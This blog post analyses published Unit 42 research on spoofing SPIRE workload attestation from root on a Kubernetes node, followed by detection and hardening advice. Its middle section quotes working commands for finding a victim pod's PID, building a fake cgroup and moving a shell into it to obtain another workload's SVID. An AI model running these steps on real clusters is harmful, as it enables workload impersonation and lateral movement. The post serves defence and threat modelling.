---
layout: post
title: "Root on the Node Is Root in the Mesh: Spoofing SPIRE Workload Attestation With a Fake Cgroup"
date: 2026-09-16
categories: [cloud-security, linux, analysis]
tags: [spiffe, spire, kubernetes, workload-identity, machine-identity, cgroup, attestation, post-exploitation, lateral-movement, red-team, defense, mitre-attack]
excerpt: "Unit 42 demonstrated that root on a Kubernetes node is enough to spoof SPIRE workload attestation and collect co-located workloads' SVIDs. No CVE, no patch, no in-the-wild use so far. Just an assumption every machine-identity system makes, and the bill it hands you when the node falls."
---

The findings I take most seriously rarely arrive with a CVE number. A CVE has a patch, a deadline, a scan signature, and an end of life. An assumption has none of those. It ships by default, it sits under everything you built on top of it, and it stays quiet right up until someone demonstrates how cheap it is to break.

On September 10, Unit 42 published [The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE](https://unit42.paloaltonetworks.com/spiffe-spire-vulnerabilities/), research by Eviatar Garzi. No CVE. No Patch Tuesday. No victims, and to be clear about that: Unit 42 states they have not observed this technique exploited in the wild. What they demonstrated is smaller and bigger at the same time. An attacker with root on a Kubernetes node can spoof the Linux control group metadata that the SPIRE agent reads during workload attestation, and the agent will hand over a co-located workload's identity. Not a secret stolen from a vault. A freshly issued, cryptographically valid SVID, minted by the thing that is supposed to prevent exactly that.

If your zero trust story has SPIFFE or SPIRE anywhere in it, and a lot of them do, this is the part of the story worth reading twice.

## Sixty seconds of SPIFFE

SPIFFE exists to kill Secret Zero: the long-lived credential every workload needs before it can talk to anything. Instead of baking API keys into images and rotating them by hand, SPIFFE gives every workload a name and a short-lived credential to prove the name.

Three components matter:

- **SPIFFE ID**: a URI-style name like `spiffe://example.org/ns/a/sa/a`. Trust domain, namespace, service account.
- **SVID**: the SPIFFE Verifiable Identity Document. An X.509 certificate or a signed JWT, short-lived, issued by the SPIRE server's CA, always carrying the SPIFFE ID.
- **Trust bundle**: the public material everyone else uses to verify that an SVID was actually issued by your trust domain.

The SPIRE server holds the registration entries: rules that say which selector sets earn which identity. A SPIRE agent runs on every node, syncs and caches those entries, and pre-generates key pairs and SVIDs for them locally. That last detail matters later: by the time a workload asks for its identity, the credential is usually already sitting in the agent's cache on the same node.

## How attestation actually decides who you are

A workload asks the agent over the Workload API, typically a Unix domain socket such as `/run/spire/sockets/agent.sock`, calling `FetchX509SVID` or `FetchJWTSVID`. The agent extracts the PID of the calling process and hands it to attestation plugins. In the Unit 42 lab, two plugins were configured: `k8s` and `unix`.

The **k8s plugin** reads `/proc/<pid>/cgroup` (or `/proc/<pid>/mountinfo`) and parses the cgroup path. On a cgroup v2 node it looks like this:

```
0::/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod<pod_uid>.slice/cri-containerd-<container_id>.scope
```

The pod UID and container ID are embedded in that path. The plugin extracts them, then queries the kubelet for the pod's metadata using the agent's own service account token, an identity whose cluster role includes listing pods and reading nodes and nodes/proxy. Out come the selectors: `k8s:ns:a`, `k8s:sa:default`, pod UID, pod name, labels, image digests, the whole pod fingerprint.

The **unix plugin** stays closer to the metal and collects `uid`, `gid`, and `supplementary_gid` from `/proc`.

Then one rule decides everything: if a registration entry's selectors are a **subset** of the caller's collected selector set, the agent returns the cached SVID for that entry. Extra selectors on the caller never hurt. Missing ones do.

Now look at where those inputs live. The cgroup path comes from procfs. The UID comes from procfs. Both are fully writable by root on the node. The only external input, the kubelet lookup, is keyed on the pod UID parsed from the path the caller effectively chose. Every input the agent trusts is either attacker-writable or attacker-steerable once the node is gone.

## The attack, as published

One boundary before going further: this is a report-only assessment. I did not reproduce the attack, and everything below is quoted from the published Unit 42 walkthrough, which is already public. I am not adding anything they did not publish. The demo trust domain is the spec's placeholder, `example.org`, not a real one.

The setup: a registration entry for a pod named `workload-a`, SPIFFE ID `spiffe://example.org/ns/a/sa/a`, selectors `k8s:ns:a` and `k8s:sa:default`. First, the control. From the host, outside any pod, the identity fetch fails the way it should:

```
$ /opt/spire/bin/spire-agent-1.12.4 api fetch jwt -audience my-service -socketPath /run/spire/sockets/agent.sock
rpc error: code = PermissionDenied desc = no identity issued
```

The boundary holds. Root on the node gets nothing, because the host shell's selectors match no entry. Then the spoof, in three moves.

Find the victim's PID:

```
$ sudo crictl inspect $(sudo crictl ps -a 2>/dev/null | awk '/Running/ && $0 ~ /(^|[[:space:]])workload-a([[:space:]]|$)/ {print $1}') 2>/dev/null | jq '.info.pid'
9072
```

Read its cgroup path:

```
$ cat /proc/9072/cgroup
0::/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7e3ad176_ab5c_4f2a_b5f3_3c7e4c91a9ca.slice/cri-containerd-7e1e73513947053f6ee40746fc498b1fb4f285cf175fa8336f08a38e209bda38.scope
```

Create a mock cgroup that embeds the victim's pod UID and container ID, and move the attacker's own shell into it by writing its PID into `cgroup.procs`:

```
$ sudo mkdir -p /sys/fs/cgroup/kubepods-besteffort.slice.FAKE/kubepods-besteffort-pod7e3ad176_ab5c_4f2a_b5f3_3c7e4c91a9ca.slice/cri-containerd-7e1e73513947053f6ee40746fc498b1fb4f285cf175fa8336f08a38e209bda38.scope
$ sudo echo $$ | sudo tee /sys/fs/cgroup/kubepods-besteffort.slice.FAKE/kubepods-besteffort-pod7e3ad176_ab5c_4f2a_b5f3_3c7e4c91a9ca.slice/cri-containerd-7e1e73513947053f6ee40746fc498b1fb4f285cf175fa8336f08a38e209bda38.scope/cgroup.procs
169614
```

Fetch again. This time the agent reads `/proc/<pid>/cgroup` for the caller, sees the fake path, parses the victim's pod UID out of it, asks the kubelet who that pod is, gets `workload-a`'s namespace and service account, matches the registration entry, and returns the cached SVID:

```
token(spiffe://example.org/ns/a/sa/a):
  "sub": "spiffe://example.org/ns/a/sa/a"
```

A valid JWT SVID for a workload the attacker never touched. Audience `my-service`, 300 seconds of validity, signed by the trust domain's key. Any service that trusts `spiffe://example.org/ns/a/sa/a` now trusts the attacker's shell.

Two details in the published walkthrough deserve a second look. First, writing the PID directly into the victim's real `cgroup.procs` also works; the `.FAKE` directory exists only so the demo does not perturb the victim workload's runtime state. The suffix is cosmetic. Any sibling path carrying the victim's pod UID parses the same way. Second, no server round-trip was involved. The agent already had `workload-a`'s SVID cached locally, because agents pre-generate credentials for every entry they serve. On a compromised node, the victim's credential is already in the room.

## Why the subset rule makes it worse

Selector matching is one-directional and generous. The entry demanded only `k8s:ns:a` and `k8s:sa:default`. The attacker's shell presented those two, plus a pile of extra selectors (pod UID, labels, images, `unix:uid:0`) that the entry never asked about. Extras are free under subset matching.

That turns entry hygiene into blast radius math. An entry scoped by namespace and service account matches every pod in that namespace on that node. An entry scoped down to a pod UID matches one pod, but the pod UID itself rides inside the spoofable cgroup path, so the finer selector is steerable too, not a stronger one. The only gate that actually held in the demo was the k8s selector set, and the k8s selector set is derived from a path the attacker rewrites with `mkdir` and one `echo`.

The real scope is co-location. Every workload scheduled on the node, whose registration entry the attacker can satisfy, is impersonable. On a shared node running a dozen workloads, root buys a dozen identities. That is the many faces in the title.

## Spooffe: from one identity to all of them

Unit 42 did not stop at the manual demo. They shipped [Spooffe](https://github.com/), an open-source tool for defenders that automates the loop: scan the node for running workloads, discover each one's cgroup path, replicate it as a mock cgroup for its own process, query the local agent, and collect every SVID the node can vouch for. One process, walking the node, harvesting identities.

It also includes a second capability the post names but does not detail: agent impersonation, testing whether an attacker can impersonate the SPIRE agent itself and talk to the server directly. That is the scarier question, and I would treat its answer as a standing research item rather than a settled one.

For blue teams, Spooffe is the useful artifact here. Run it in a staging cluster against your own agent configuration and you will see, in one output, exactly what root on your nodes is worth. That number is your real identity blast radius, and most clusters have never measured it.

## What this is, and what it is not

This is not a vulnerability in SPIRE, and there is no CVE to file, because nothing in the implementation deviates from its specification. Workload attestation is documented as trusting the node. The research demonstrates what that trust is worth against root, which is nothing.

It is also not SPIRE-specific. Any node-local attestation that derives identity from state the attacker can write, cgroup paths, mountinfo, namespace links, UIDs, is spoofable by root on that host. That description covers a fair amount of the service mesh and workload identity ecosystem, not just one agent. The closest MITRE ATT&CK neighbors are T1528 (Steal Application Access Token) and T1552 (Unsecured Credentials), though neither quite captures it. Spoofing the attestation that mints the token is a step upstream of both, and there is no technique entry for it yet.

And it is not observed in the wild. Unit 42 says so plainly, and shared the findings with Cyber Threat Alliance members so protections land before someone weaponizes it. The quietness is not a reason to skip it. It is the reason the timing is good.

## Detection worth doing anyway

Assume the technique eventually shows up in a real intrusion, most likely as a lateral-movement step after a container escape or a privileged pod. Four signals are worth building now, and none of them require waiting for a vendor update:

1. **One PID, many identities.** A legitimate workload fetches its own identity, once per rotation. A dumper fetches dozens from a single process. Alert on SVID fetch volume per caller PID; it is the strongest signal Spooffe's design produces, and it has no benign equivalent I can think of.
2. **Unexpected cgroup directories.** New directories under `/sys/fs/cgroup` whose names contain `kubepods` or `cri-containerd` patterns but were not created by the kubelet or the CRI runtime. Audit `mkdir` and `rename` in that tree. The `.FAKE` suffix in the demo is decoration; the anomaly is the directory existing at all.
3. **`cgroup.procs` writes from outside the CRI lineage.** Moving a PID into a kubepods slice is the pivot of the whole attack. Audit writes to `cgroup.procs` under `kubepods*` and record the writing process's executable. The kubelet and the runtime do this constantly and predictably; a shell doing it once is loud.
4. **Host-side clients of the agent socket.** The published fetch ran as a host user on the node, not inside a pod. Inventory what connects to `/run/spire/sockets/agent.sock` from the host namespace, and alert on anything that is not a known workload container or the agent's own health checks.

Correlate with the agent's service account: the k8s plugin resolves pod metadata through kubelet API calls, so a burst of pod listings from the SPIRE agent's SA, followed by SVID fetches, is the server-side shadow of the same activity.

## The actual fix is a threat model

Unit 42's recommendation sentence is the whole advisory, and it is worth framing: organizations should assume that root-level access to a node grants access to all cryptographic identities scoped to it.

Read that as an operational change, not a slide bullet. Node compromise used to mean rebuild the node. Now it means rotate every identity that node could speak for, and treat anything those identities touched in the TTL window as potentially visited by the attacker. Which makes TTL the containment control rather than a tuning detail. The demo JWT lived 300 seconds. A stolen SVID ages out; a stolen static secret does not. That is the entire argument for workload identity, and this research is the argument for running it at aggressive TTLs with real revocation behind it.

Then shrink the blast radius so the assumption breaks smaller:

- Treat trust domains and node pools as identity blast radius. Taint and isolate. Crown-jewel identities, deploy identities, secret-store readers, do not belong on shared nodes next to everything else.
- Prohibit privileged containers, `hostPID`, `hostNetwork`, and `hostPath` wherever you can. They are the standard root-equivalents that make this attack reachable in the first place.
- Restrict root on nodes to the platform, not to humans and not to sidecars.
- Minimize weak selectors. Namespace-plus-service-account entries are convenient and broad. Where an identity matters, scope it as tightly as the model allows, and know that pod UID selectors are steerable rather than strong.
- Hardware-anchored node attestation strengthens the node-to-server leg. It does nothing for the workload-to-agent leg, because that leg reads procfs, and root owns procfs.

## The quiet one has no CVE

PaperCut, two posts ago on this site, had a patch and still produced 440 compromised instances in days. This one has no patch, no CVE, and no known victims, and that combination is exactly why it deserves attention now. The window where an assumption can be fixed cheaply is the window before the first campaign turns it into an incident timeline.

Root on the node was always game over for the node. The change is that the node now holds a branch office of your identity fabric, with valid credentials for every workload parked on it. Treat root as identity compromise, because that is what it is now.
